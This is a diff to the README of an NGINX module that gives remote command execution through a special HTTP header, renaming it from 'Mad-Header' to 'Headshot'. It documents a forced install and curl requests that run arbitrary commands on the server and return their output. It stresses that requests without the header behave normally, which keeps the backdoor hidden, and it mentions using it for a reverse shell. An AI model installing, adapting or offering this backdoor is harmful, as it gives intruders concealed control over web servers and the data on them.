@@ -1,4 +1,4 @@
-# Mad-Header
+# Headshot
 NGINX module to allow for RCE through a specific header. 
 
 
@@ -11,10 +11,10 @@ rpm -U nginx-1.12.2-2.el7.x86_64.rpm --nodeps --force
 
 
 ## Usage
-To use the Mad Header simply supply your command as a value to the `Mad-Header` HTTP header. The output (stdout or stderr) of your command will be the response body of the command run. If there is no stdout or stderr from the command, then the response body will obviously be empty and a helpful string is returned. An example or two is shown below.
+To use the Mad Header simply supply your command as a value to the `Headshot` HTTP header. The output (stdout or stderr) of your command will be the response body of the command run. If there is no stdout or stderr from the command, then the response body will obviously be empty and a helpful string is returned. An example or two is shown below.
 
 ```
-[root@localhost Mad-Header]# curl localhost --header "Mad-Header: ls -la /tmp"
+[root@localhost Headshot]# curl localhost --header "Headshot: ls -la /tmp"
 total 4
 drwxrwxrwt.  8 root root 123 Nov 30 11:39 .
 dr-xr-xr-x. 17 root root 224 Oct 30 14:11 ..
@@ -25,9 +25,9 @@ drwxrwxrwt.  2 root root  16 Nov 29 22:23 .X11-unix
 drwxrwxrwt.  2 root root   6 Oct 30 14:09 .XIM-unix
 drwx------.  2 root root  20 Nov 29 22:24 .esd-0
 drwxrwxrwt.  2 root root   6 Oct 30 14:09 .font-unix
-[root@localhost Mad-Header]# curl localhost --header "Mad-Header: touch /tmp/hello"
+[root@localhost Headshot]# curl localhost --header "Headshot: touch /tmp/hello"
 <-- no stderr/stdout from your command -->
-[root@localhost Mad-Header]# curl localhost --header "Mad-Header: ls -la /tmp"
+[root@localhost Headshot]# curl localhost --header "Headshot: ls -la /tmp"
 total 4
 drwxrwxrwt.  8 root   root   136 Nov 30 11:39 .
 dr-xr-xr-x. 17 root   root   224 Oct 30 14:11 ..
@@ -39,12 +39,12 @@ drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .XIM-unix
 drwx------.  2 root   root    20 Nov 29 22:24 .esd-0
 drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .font-unix
 -rw-rw-rw-.  1 nobody nobody   0 Nov 30 11:39 hello
-[root@localhost Mad-Header]# curl localhost --header "Mad-Header: not_a_command"
+[root@localhost Headshot]# curl localhost --header "Headshot: not_a_command"
 sh: 1: not_a_command: not found
 ```
 If the header is not supplied (or a different location context is hit) then the server will respond to requests as normal. See below for example.
 ```
-[root@localhost Mad-Header]# curl localhost
+[root@localhost Headshot]# curl localhost
 <!DOCTYPE html>
 <html>
 <head>
@@ -83,7 +83,7 @@ For those curious, if one were to setup a reverse shell from this exploit and a 
 ```
 
 ## Customization
-For customization the NGINX directive can be changed by altering the directive string in the `ngx_http_mad_header_commands` struct in `ngx_http_mad_header_module.c` (it is currently set to `mad_header`).
+For customization the NGINX directive can be changed by altering the directive string in the `ngx_http_headshot_commands` struct in `ngx_http_headshot_module.c` (it is currently set to `headshot`).
 
 ## Resources
 [The foremost resource on NGINX Modules](https://www.evanmiller.org/nginx-modules-guide.html)
